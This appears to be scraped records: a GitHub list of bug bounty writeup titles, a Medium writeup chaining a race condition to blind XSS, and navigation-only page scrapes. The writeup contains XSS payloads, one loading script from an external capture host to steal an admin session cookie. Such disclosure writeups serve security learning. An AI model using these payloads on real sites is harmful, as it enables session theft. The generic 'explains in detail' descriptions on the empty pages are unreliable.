devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference 5.3k stars 1.1k forks Branches Tags Activity Star Notifications You must be signed in to change notification settings Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights devanshbatham/Awesome-Bugbounty-Writeups master Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 59 Commits static static README.md README.md View all files Repository files navigation README Contents Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) Clickjacking (UI Redressing Attack) Local File Inclusion (LFI) Subdomain Takeover Denial of Service (DOS) Authentication Bypass SQL injection Insecure Direct Object Reference (IDOR) 2FA Related issues CORS Related issues Server Side Request Forgery (SSRF) Race Condition Remote Code Execution (RCE) Android Pentesting Contributing Maintainers Cross Site Scripting (XSS) From P5 to P2 to 100 BXSS Google Acquisition XSS (Apigee) XSS on Microsoft.com via Angular Js template injection Researching Polymorphic Images for XSS on Google Scholar Netflix Party Simple XSS Stored XSS in google nest Self XSS to persistent XSS on login portal Universal XSS affecting Firefox XSS WAF Character limitation bypass like a boss Self XSS to Account Takeover Reflected XSS on Microsoft subdomains The tricky XSS Reflected XSS in AT&T XSS on Google using Acunetix Exploiting websocket application wide XSS Reflected XSS with HTTP Smuggling XSS on Facebook instagram CDN server bypassing signature protection XSS on Facebook's Acquisition Oculus XSS on sony Subdomain Exploiting Self XSS Effortlessly Finding Cross Site Scripting inclusion XSSI Bugbounty a DOM XSS Blind XSS : a mind Game FireFox IOS QR code reader XSS(CVE-2019-17003) HTML injection to XSS CVE-2020-13487 | Authenticated Stored Cross-site Scripting in bbPress XSS at error page of repository code XSS like a Pro How I turned self XSS to stored XSS via CSRF XSS Stored on Outlook web XSS Bug 20 Chars Blind XSS Payload XSS in AMP4EMAIL(DOM clobbering) DOM Based XSS bug bounty writeup XSS will never die 5000 USD XSS issue at avast desktop antivirus XSS to account takeover How Paypal helped me to generate XSS Bypass Uppercase filters like a PRO(XSS advanced methods) Stealing login credentials with reflected XSS bughunting xss on cookie popup warning XSS is love Oneplus XSS vulnerability in customer support portal Exploiting cookie based XSS by finding RCE Stored XSS on zendesk via macros XSS in ZOHO main DOM based XSS in private program Bugbounty writeup : Take Attention and get stored XSSS How I xssed admin account Clickjacking XSS on google Stored XSS on laporbugid Leveraging angularjs based XSS to privilege escalation How I found XSS by searching in shodan Chaining caache poisining to stored XSS XSS to RCE XSS on twitter worth 1120 Reflected XSS in ebay.com Cookie based XSS exolpoitation 2300 bug bounty What do netcat -SMTP-self XSS have in common XSS on google custom search engine Story of a Full Account Takeover vulnerability N/A to Accepted Yeah I got p2 in 1 minute stored XSS via markdown editor Stored XSS on indeed Self XSS to evil XSS How a classical XSS can lead to persistent ATO vulnerability Reflected XSS in tokopedia train ticket Bypassing XSS filter and stealing user credit card data Googleplex.com blind XSS Reflected XSS on error page How I was able to get private ticket response panel and fortigate web panel via blind XSS Unicode vs WAF Story of URI based XSS with some simple google dorking Stored XSS on edmodo XSSed my way to 1000 Try harder for XSS From parameter pollution to XSS MIME sniffing XSS Stored XSS on techprofile Microsoft Tale of a wormable Twitter XSS XSS attacks google bot index manipulation From Reflected XSS to Account takeover Stealing local storage data through XSS CSRF attack can lead to stored XSS XSS Reflected (filter bypass) XSS protection bypass on hackerone private program Just 5 minutes to get my 2nd Stored XSS on edmodo.com Multiple XSS in skype.com Obtaining XSS using moodle featured and minor bugs XSS on 403 forbidden bypass akamai WAF How I was turn self XSS into reflected XSS A Tale of 3 XSS Stored XSS on Google.com Stored XSS in the Guides gameplaersion (www.dota2.com) Admin google.com reflected XSS Paypal Stored security bypass Paypal DOM XSS main domain Bugbounty : The 5k$ Google XSS Facebook stored XSS Ebay mobile reflected XSS Magix bugbounty XSS writeup Abusing CORS for an XSS on flickr XSS on google groups Oracle XSS Content types and XSS Facebook Studio Admob Creative image XSS Amazon Packaging feedback XSS PaypalTech XSS Persistent XSS on my world Google VRP XSS in device management Google VRP XSS Google VRP Blind XSS WAZE XSS Referer Based XSS How we invented the Tesla DOM XSS Stored XSS on rockstar game How I was able to bypass strong XSS protection in well known website imgur.com Self XSS to Good XSS That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS XSS using dynamically generated js file Bypassing XSS filtering at anchor Tags XSS by tossing cookies Coinbase angularjs dom XSS via kiteworks Medium Content spoofing and XSS Managed Apps and music a tale of two XSSes in Google play Making an XSS triggered by CSP bypass on twitter Escalating XSS in phantomjs image rendering to SSRF Reflected XSS in Simplerisk Stored XSS in the heart of the russian email provider How I built an XSS worm on atmail XSS on bugcrowd and so many other websites main domain Godaddy XSS affects parked domains redirector Processor Stored XSS in Google image search A pair of plotly bugs stored XSS abd AWS metadata Near universal XSS in mcafee web gateway Penetrating Pornhub XSS vulns How I found a 5000 Google maps XSS by fiddling with protobuf Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities Lightwight markup a trio of persistent XSS in gitlab XSS ONE BAY SVG XSS in unifi Stored XSS in unifi V4.8.12 controller Turning self XSS into good XSS v2 SWF XSS DOM Based XSS XSS filter bypass in Yahoo Dev flurry XSS on Flickr Two vulnerabilities makes an exploit XSS and csrf in bing Runkeeper stored XSS Google sleeping XSS awakens 5k bounty Poisoning the well compromising godaddy customer support with blind XSS UBER turning self XSS to good XSS XSS on facebook via png content types Cloudflare XSS How I found XSS Vulnerability in Google XSS to RCE One payload to XSS them all Self XSS on komunitas Reclected XSS on alibabacloud Self XSS on komunitas bukalapak A real XSS in OLX Self XSS using IE adobes Stealing local storage through XSS 1000 USD in 5mins Stored XSS in Outlook OLX reflected XSS My first stored XSS on edmodo.com Hack your form new vector for BXSS How I found Blind XSS vulnerability in redacted.com 3 XSS in protonmail for iOS XSS in edmodo wihinin 5 mins Stil work redirect Yahoo subdomain XSS XSS in azure devOps Shopify reflected XSS Muliple Stored XSS on tokopedia Stored XSS on edmodo A unique XSS scenario 1000 Bounty Protonmail XSS Stored Chaining tricky ouath exploitation to stored XSS Antihack XSS to php uplaod Reflected XSS in zomato XSS through SWF file Hackyourform BXSS Reflected XSS on ASUS Stored XSS via Alternate text at zendesk support How I stumbled upon a stored XSS : my first bug bounty story Cookie based Self XSS to Good XSS Reflected XSS on amazon XSS worm : a creative use of web application vulnerability Google code in XSS Self XSS on indeed.com How I accidentally found XSS in Protonmail for iOS app XML XSS in yandex.ru by accident Critical Stored XSS vulnerability XSS bypass using META tag in realestate.postnl.nl Edmodo XSS bug XSS in hiden input fields How I discovered XSS that affected over 20 uber subdomains DOM based XSS or why you should not rely on cloudflare too much XSS in dynamics 365 XSS deface with html and how to convert the html into charcode Cookie based injection XSS making explitable with exploiting other vulns XSS with put in ghost blog XSS using a Bug in safari and why blacklists are stupid Magic XSS with two parameters DOM XSS bug affecting tinder shopify Yelp Persistent XSS unvalidated open graph embed at linkedin.com My first 0day exploit CSP Bypass Reflected XSS Google Stored XSS in payments XSS on dropbox Weaponizing XSS attacking internal domains How I XSSed UBER and bypassed CSP RXSS and CSRF bypass to Account takeover Another XSS in google collaboratory How I bypassed AKAMAI waf in overstock.com Reflected XSS at philips.com XSS vulnerabilities in multiple iframe busters affecting top tier sites Reflected DOM XSS and clickjacking silvergoldbull Stored XSS vulnerability in h1 private Authbypass SQLi and XSS Stored XSS vulnerability in tumblr XSS in google code jam Mapbox XSS My first valid XSS Stored XSS in webcomponents.org 3 minutes XSS icloud.com DOM based XSS XSS at hubspot and in email areas Self XSS leads to blind XSS and Reflected XSS Refltected XSS primagames.com Stored XSS in gameskinny Blind XSS in Chrome experments Google Yahoo two XSSI vulnerabilities chained to steal user information (750$) How I found XSS on amazon A blind XSS in messengers twins XSS in microsoft Subdomain Persistent XSS at ah.nl The 12000 intersection betwenn clickjaking , XSS and DOS XSS in google collaboratory CSP bypass How I found blind XSS in apple Reflected XSS on amazon.com How I found XSS in 360totalsecurity The 2.5 BTC Stored XSS XSS Vulnerability in Netflix A story of a UXSS via DOM XSS clickjacking in steam inventory helper How I found XSS via SSRF vulnerability Searching for XSS found ldap injection how I converted SSRF to XSS in a SSRF vulnerable JIRA Reflected XSS in Yahoo subdomain Account takeover and blind XSS How I found 5 stored XSS on a private program Persistent XSS to steal passwords(Paypal) Self XSS + CSRF to stored XSS Stored XSS in yahoo and subdomains XSS in microsoft Blind XSS at customer support panel Reflected XSS on stackoverflow Stored XSS in Yahoo XSS 403 forbidden Bypass Turning self XSS into non self XSS via authorization issue at paypal A story of stored XSS bypass Mangobaaz hacked XSS to credentials How I got stored XSS using file upload Bypassing CSP to abusing XSS filter in edge XSS to session Hijacking Reflected XSS on www.zomato.com XSS in subdomain of yahoo XSS in yahoo.net subdomain Reflected XSS moongaloop swf version 62x Google adwords 3133.7 Stored XSS How I found a surprising XSS vulnerability on oracle netsuite Stored XSS on snapchat How I was able to bypass XSS protection on h1 private program Reflected XSS possible XSS via angularjs template injection hostinger Microsoft follow feature XSS (CVE-2017-8514) XSS protection bypass made my quickest bounty ever Taking note XSS to RCE in the simplenote electron client VMWARE official vcdx reflected XSS How I pwned a company using IDOR and Blind XSS From Recon to DOM based XSS Local file read via XSS Non persistent XSS at microsoft A Stored XSS in google (double kill) Filter bypass to Reflected XSS on finance.yahoo.com (mobile version) 900$ XSS in yahoo : recon wins How I bypassed practos firewall and triggered an XSS vulnerability Stored XSS to full information disclosure Story of parameter specific XSS Chaining self XSS with UI redressing leading to session hijacking Stored XSS with arbitrary cookie installation Reflective XSS and Open redirect on indeed.com subdomain How I found reflected XSS on Yahoo subdomain Dont just alert(1) because XSS is more fun UBER XSS by helpe of KNOXSS Reflected XSS in Yahoo Reflected XSS on ww.yahoo.com XSS because of wrong content type header Cross Site Request Forgery (CSRF) How a simple CSRF attack turned into a P1 How I exploited the json csrf with method override technique How I found CSRF(my first bounty) Exploiting websocket application wide XSS and CSRF Site wide CSRF on popular program Using CSRF I got weird account takeover CSRF CSRF CSRF Google Bugbounty CSRF in learndigital.withgoogle.com CSRF token bypass [a tale of 2k bug] 2FA bypass via CSRF attack Stored iframe injection CSRF account takeover Instagram delete media CSRF An inconsistent CSRF Bypass CSRF with clickjacking worth 1250 Sitewide CSRF graphql Account takeover using CSRF json based CORS to CSRF attack My first CSRF to account takeover 4x chained CSRFs chained for account takeover CSRF can lead to stored XSS Yet other examples of abusing CSRF in logout Wordpress CSRF to RCE Bruteforce user IDs via CSRF to delete all the users with CSRF attack CSRF Bypass using cross frame scripting Account takeover via CSRF A very useful technique to bypass the CSRF protection CSRF account takeover exlpained automated manual bugbounty CSRF to account takeover How I got 500USD from microsoft for CSRF vulnerability Critical Bypass CSRF protection RXSS CSRF bypass to full account takeover Youtube CSRF Self XSS + CSRF = Stored XSS Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile JSON CSRF attack on a social networking site Hacking facebook oculus integration CSRF Amazon leaking CSRF token using service worker Facebook graphql CSRF Chain the vulnerabilities and take your report impact on the moon csrf to html injection Partial CSRF to Full CSRF Stealing access token of one drive integration by chain csrf vulnerability Metasploit web project kill all running taks CSRF CVE-2017-5244 Messenger site wide CSRF Hacking Facebook CSRF device login flow Two vulnerabilities makes an exploit XSS and CSRF in bing How I bypassed Facebook in 2016 Ubiquiti bugbounty unifi generic CSRF protection Bypass Bypass Facebook CSRF Facebook CSRF full account takeover Clickjacking (UI redressing attack) Google Bug bounty Clickjacking on Google payment Google APIs Clickjacking worth 1337$ Clickjacking + XSS on Google org Bypass CSRF with clickjacking on Google org 1800 worth Clickjacking Account takeover with clickjacking Clickjacking on google CSE How I accidentally found clickjacking in Facebook Clickjacking on google myaccount worth 7500 Clickjacking in google docs and void typing feature Reflected DOM XSS and Clickjacking binary.com clickjacking vulnerability exploiting HTML5 security features 12000 intersection betwen clickjacking XSS and denial of service Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper Yet another Google Clickjacking Redressing instagram leaking application tokens via instagram clickjacking vulnerability Self XSS to Good XSS and Clickjacking Microsoft Yammer clickjacking exploiting HTML5 security features Firefox find my device clickjacking Whatsapp Clickjacking vulnerability Telegram WEB client clickjacking vulnerability Facebook Clickjacking : how we put a new dress on facebook UI Local File Inclusion (LFI) RFI LFI Writeup My first LFI Bug bounty LFI at Google.com Google LFI on production servers in redacted.google.com LFI to 10 server pwn LFI in apigee portals Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE How we got LFI in apache drill recom like a boss Bugbounty journey from LFI to RCE LFI to RCE on deutche telekom bugbounty From LFI to RCE via PHP sessions magix bugbounty magix.com XSS RCE SQLI and LFI LFI in nokia maps Subdomain Takeover How I bought my way to subdomain takeover on tokopedia Subdomain Takeover via pantheon Subdomain takeover : a unique way Escalating subdomain takeover to steal sensitive stuff Subdomain takeover awarded 200 Subdomain takeover via wufoo service Subdomain takeover via Hubspot Souq.com subdomain takeover Subdomain takeover : new level Subdomain takeover due to misconfigured project settings for custom domain Subdomain takeover via shopify vendor Subdomain takeover via unsecured s3 bucket Subdomain takeover worth 200 Subdomain takeover via campaignmonitor How to do 55000 subdomain takeover in a blink of an eye Subdomain takeover Starbucks (Part 2) Subdomain takeover Starbucks Uber wildcard subdomain takeover Bugcrowd domain subdomain takeover vulnerability Subdomain takeover vulnerability (Lamborghini Hacked) Authentication bypass on uber's SSO via subdomain takeover Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com Denial of Service (DOS) Long String DOS AIRDOS Denial of Service DOS vulnerability in script loader (CVE-2018-6389) Github actions DOS Application level denial of service Banner grabbing to DOS and memory corruption DOS across Facebook endpoints DOS on WAF protected sites DOS on Facebook android app using zero width no break characters Whatsapp DOS vulnerability on android and iOS Whatsapp DOS vulnerability in iOS android Authentication Bypass Touch ID authentication Bypass on evernote and dropbox iOS apps Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect Two factor authentication bypass Instagram multi factor authentication bypass Authentication bypass in nodejs application Symantec authentication Bypass Authentication bypass in CISCO meraki Slack SAML authentocation bypass Authentication bypass on UBER's SSO Authentication Bypass on airbnb via oauth tokens theft Inspect element leads to stripe account lockout authentication Bypass Authentication bypass on SSO ubnt.com SQL Injection(SQLI) Tricky oracle SQLI situation Exploiting “Google BigQuery” SQLI SQLI via stopping the redirection to a login page Finding SQLI with white box analysis a recent bug example Bypassing a crappy WAF to exploit a blind SQLI SQL Injection in private-site.com/login.php Exploiting tricky blind SQLI SQLI in forget password fucntion SQLI Bug Bounty File Upload blind SQLI SQL Injection SQLI through User Agent SQLI in insert update query without comma SQLI for 50 bounty Abusing MYSQL CLients SQLI Authentication Bypass AutoTrader Webmail ZOL Zimbabwe Authentication Bypass to XSS & SQLi SQLI bootcamp.nutanix.com SQLI in University of Cambridge Making a blind SQLI a little less Blind SQLI SQLI amd silly WAF Attacking Postgresql Database Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection A 5 minute SQLI Union based SQLI writeup SQLI with load file and into outfile SQLI is Everywhere SQLI in Update Query Bug Blind SQLI Hootsuite Yahoo – Root Access SQLI – tw.yahoo.com Step by Step Exploiting SQLI in Oculus Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) Tesla Motors blind SQLI SQLI in Nokia Sites Insecure Direct Object Reference (IDOR) Disclose Private Dashboard Chart's name and data in Facebook Analytics Disclosing privately shared gaming clips of any user Adding anyone including non-friend and blocked people as co-host in personal event! Page analyst could view job application details Deleting Anyone's Video Poll 2FA related issues 2FA Bypass via logical rate limiting Bypass Bypass 2FA in a website Weird and simple 2FA bypass How I cracked 2FA with simple factor bruteforce Instagram account is reactivated without entering 2FA How to bypass 2FA with a HTTP header How I hacked 40k user accounts of microsoft using 2FA bypass outlook How I abused 2FA to maintain persistence after password recovery change google microsoft instragram Bypass hackerone 2FA Facebook Bug bounty : How I was able to enumerate instagram accounts who had enabled 2FA CORS related issues CORS bug on google's 404 page (rewarded) CORS misconfiguration leading to private information disclosure CORS misconfiguration account takeover out of scope to grab items in scope Chrome CORS Bypassing CORS CORS to CSRF attack An unexploited CORS misconfiguration reflecting further issues Think outside the scope advanced cors exploitation techniques A simple CORS misconfiguration leaked private post of twitter facebook instagram Explpoiting CORS misconfiguration Full account takeover through CORS with connection sockets Exploiting insecure CORS API api.artsy.net Pre domain wildcard CORS exploitation Exploiting misconfigured CORS on popular BTC site Abusing CORS for an XSS on flickr Server Side Request Forgery (SSRF) Exploiting an SSRF trials and tribulations SSRF on PDF generator Google VRP SSRF in Google cloud platform stackdriver Vimeo upload function SSRF SSRF via ffmeg processing My first SSRF using DNS rebinding Bugbounty simple SSRF SSRF reading local files from downnotifier server SSRF vulnerability Gain adfly SMTP access with SSRF via gopher protocol Blind SSRF in stripe.com due to senntry misconfiguration SSRF port issue hidden approch The jorney of web cache firewall bypass to SSRF to AWS credentials compromise SSRF to local file read and abusing aws metadata pdfreactor SSRF to root level local files read which lead to RCE SSRF trick : SSRF XSPA in micosoft's bing webwaster Downnotifeer SSRF Escalating SSRF to RCE Vimeo SSRF with code execution potential SSRF in slack Exploiting SSRF like a boss AWS takeover SSRF javascript Into the borg of SSRF inside google production network SSRF to local file disclosure How I found an SSRF in yahoo guesthouse (recon wins) Reading internal files using SSRF vulnerability Airbnb chaining third party open redirect into SSRF via liveperson chat Race Condition Exploiting a Race condition vulnerabililty Race condition that could result to RCE a story with an app Creating thinking is our everything : Race condition and business logic Chaining improper authorization to Race condition to harvest credit card details A Race condition bug in Facebook chat groups Race condition bypassing team limit Race condition on web Race condition bugs on Facebook Hacking Banks With Race Conditions Race Condition Bug In Web App: A Use Case RACE Condition vulnerability found in bug-bounty program How to check Race Conditions in Web Applications Remote Code Execution (RCE) Microsoft RCE bugbounty OTP bruteforce account takeover Attacking helpdesk RCE chain on deskpro with bitdefender Remote image upload leads to RCE inject malicious code Finding a p1 in one minute with shodan.io RCE From recon to optimizing RCE results simple story with one of the biggest ICT company Uploading backdoor for fun and profit RCE DB creds P1 Responsible Disclosure breaking out of a sandboxed editor to perform RCE Wordpress design flaw leads to woocommerce RCE Path traversal while uploading results in RCE RCE jenkins instance Traversing the path to RCE How I chained 4 bugs features into RCE on amazon RCE due to showexceptions Yahoo luminate RCE Latex to RCE private bug bounty program How I got hall of fame in two fortune 500 companies an RCE story RCE by uploading a web config 36k Google app engine RCE How I found 2.9 RCE at yahoo Bypass firewall to get RCE RCE vulnerabilite in yahoo subdomain RCE in duolingos tinycards app from android Unrestricted file upload to RCE Getting a RCE (CTF WAY) RCE starwars How I got 5500 from yahoo for RCE RCE in Addthis Paypal RCE My First RCE (Stressed Employee gets me 2x bounty) Abusing ImageMagick to obtain RCE How Snapdeal Kept their Users Data at Risk! RCE via ImageTragick How I Cracked 2FA with Simple Factor Brute-force! Found RCE but got Duplicated “Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores IDOR to RCE RCE on AEM instance without JAVA knowledge RCE with Flask Jinja tempelate Injection Race Condition that could result to RCE Chaining Two 0-Days to Compromise An Uber Wordpress Oculus Identity Verification bypass through Brute Force Used RCE as Root on marathon Instance Two easy RCE in Atlassian Products RCE in Ruby using mustache templates About a Sucuri RCE…and How Not to Handle Bug Bounty Reports Source code disclosure vulnerability Bypassing custom Token Authentication in a Mobile App Facebook’s Burglary Shopping List From SSRF To RCE in PDFReacter Apache strust RCE Dell KACE K1000 Remote Code Execution Handlebars Tempelate Injection and RCE Leaked Salesforce API access token at IKEA.com Zero Day RCE on Mozilla's AWS Network Escalating SSRF to RCE Fixed : Brute-force Instagram account’s passwords Bug Bounty 101 — Always Check The Source Code ASUS RCE vulnerability on rma.asus-europe.eu Magento – RCE & Local File Read with low privilege admin rights RCE in Nokia.com Two RCE in SharePoint Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over RCE in Hubspot with EL injection in HubL Github Desktop RCE eBay Source Code leak Facebook source code disclosure in ads API XS-Searching Google’s bug tracker to find out vulnerable source code Buffer Overflow Writeups Buffer Overflow Attack Book pdf Github Repository on Buffer Overflow Attack Stack-Based Buffer Overflow Attacks: Explained and Examples How Buffer Overflow Attacks Work Binary Exploitation: Buffer Overflows WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS Android Pentesting Android Pentesting Lab (Step by Step guide for beginners!) Contributing Open Pull Requests Send me links of writeups to My Twitter : 0xAsm0d3us Maintainers This Repo is maintained by : devanshbatham e13v3n-0xb About A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Topics bugbounty bughunting bugbountytips bugbounty-writeups security-writeups bugbounty-blogs bugbounty-yahoo bugbounty-facebook bughunting-methodology bughunting-writeups Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 5.3k stars Watchers 248 watching Forks 1.1k forks Report repository Releases No releases published Packages 0 No packages published Uh oh! There was an error while loading. Please reload this page . Contributors 8 Languages Python 100.0% Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups/blob/master/README.md#server-side-request-forgery-ssrf", "title": "Awesome-Bugbounty-Writeups/README.md at master · devanshbatham/Awesome-Bugbounty-Writeups · GitHub", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups/blob/master/README.md#server-side-request-forgery-ssrf. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAwesome-Bugbounty-Writeups/README.md at master · devanshbatham/Awesome-Bugbounty-Writeups · GitHub Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://medium.com/@mohameddaher/from-p5-to-p5-to-p2-from-nothing-to-1000-bxss-4dd26bc30a82", "title": "From P5 to P2, from nothing to 1000+$ | by Mohamed Daher | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@mohameddaher/from-p5-to-p5-to-p2-from-nothing-to-1000-bxss-4dd26bc30a82. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFrom P5 to P2, from nothing to 1000+$ | by Mohamed Daher | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in From P5 to P2, from nothing to 1000+$ Mohamed Daher 4 min read · Apr 22, 2020 -- 4 Listen Share Hey all :) Hope you guys are good as always. As you asked for on twitter (make sure to follow me @D aherMohamed4 ) Here is how I was able to escalate this bug from P5 to P2 and got rewarded +1000$. So let’s start. It was the same private program as my last write up. So I’ve been hunting on this program for a week already and already reported all my findings so I was struggling to find any more bug. But not seeing them doesn’t mean they don’t exist :) So I decided to start over and create a new account. When I filled all the details, they asked me to verify my email first but I could also change the email to another one in case I made a mistake. I directly thought about Race-Condition to use any email without verifying it. Here’s how you can do it (we’ll assume that we have access to lasok@dot-coin.com and we want to register with aa@aa.com) 1/ Add an email to the account and open the email with the verification link but don’t click on it yet (In my case I added lasok@dot-coin.com and opened the mail they sent me) 2/ On the website click on “change email”. Change the email to the one you want to use without verification but don’t click on send link now. (Now I changed the email to aa@aa.com) lasok@dot-coin.com is a temp email Here comes the tricky part. You have to click on the verification link and change your email at the same time. You can do that without burp but you may have to try a few times before it works so here is a method to make it work every time: Start burp and turn intercept on Now open the verification link you received on lasok@dot-coin.com then switch tab and validate the new email on the website (aa@aa.com) then turn intercept off. Burp will forward the 2 requests together and that’s what we want. Press enter or click to view image in full size Press enter or click to view image in full size aa@aa.com was verified and I could now login to my account. In this case what you should do is to register with email@company.com, sometimes you can get access to some cool admin features. But unfortunately for me it wasn’t the case here but I still reported it and as expected, closed as P5. Press enter or click to view image in full size Thanks Roy But huh who are we to give up ? Now we have to escalate this to give a valid impact in order to be a valid bug. After some minutes I tried to escalate this to XSS. Did the same process but instead of entering a fake email in the second step I entered : <svg/onload=alert(1)> and XSS triggered. But since my email is private and only me can see it, this is a Self-XSS. So we went from Race-Condition (P5) to Self-XSS (P5). Now, what ? I remembered that this private program also had a forum dedicated to their site. I did the same process again but instead of entering a regular XSS payload I entered a Blind XSS payload. Mine was : “></script><script src=//m0m0x01d.xss.ht></script> (Tip : Use xsshunter.com tool to find blind xss) I then went to the forum, created a new weird thread (to be sure that the admin will delete it) and reported my own thread to be sure that the admins see it. Within hours I got an email alerting me that someone triggered my XSS. Reading the XSSHunter report : Triggered at : https://www.company.com/profile/XXXX Referer : https://forums.company.com/XX/index.php?/topic/123456--/ The admin saw my weird thread, then he clicked on my username → redirected to my profile → XSS triggered The reason why it triggered was that the admins had the feature to see the email of any user only by visiting their profile. I now had the session cookie of the admin and I could use it to get access to the internal panel. I directly opened a new report on Bugcrowd and some days later : Press enter or click to view image in full size So that’s how I went from a P5 Race Condition to a P5 Self XSS to a P2 Blind XSS. Hope you guys learnt something new from this write up and if you have any question about this hit me up on twitter @DaherMohamed4 I will try to reply when I’m free. Take-away : 1/ If you’r able to use any email without verification, try registering with email@domain.com you may get access to some admin features 2/ Always look for the highest severity. Here if the program accepted the bug as P4 I would get 100$ for that instead of 10x the bounty for the XSS 3/ When you find a P5 bug you may use it and chain it with another bug to increase the severity (tip 2), they are not always useless Bug Bounty Infosec Hacking Web Security -- -- 4 Written by Mohamed Daher 458 followers · 0 following Hey Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups/blob/master/README.md#race-condition", "title": "Awesome-Bugbounty-Writeups/README.md at master · devanshbatham/Awesome-Bugbounty-Writeups · GitHub", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups/blob/master/README.md#race-condition. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAwesome-Bugbounty-Writeups/README.md at master · devanshbatham/Awesome-Bugbounty-Writeups · GitHub Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
